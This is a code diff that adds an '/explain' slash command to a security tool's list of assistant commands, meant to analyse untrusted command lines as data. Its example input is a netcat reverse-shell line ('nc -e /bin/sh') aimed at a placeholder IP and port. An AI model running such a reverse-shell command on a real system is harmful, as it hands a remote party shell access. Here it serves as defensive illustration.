@@ -95,6 +95,19 @@ COMMANDS = (
         examples=["/health"],
     ),
     AssistantCommand(
+        name=AssistantCommandName.EXPLAIN,
+        slash="/explain",
+        aliases=["/explain-command"],
+        title="Explain a command line",
+        description=(
+            "Analyze an untrusted command line as data and explain its "
+            "behavior, risk, indicators, and defensive checks."
+        ),
+        usage="/explain <command-line>",
+        category="Analyze",
+        examples=["/explain nc -e /bin/sh 192.0.2.10 4444"],
+    ),
+    AssistantCommand(
         name=AssistantCommandName.HELP,
         slash="/help",
         aliases=["/?", "/commands"],
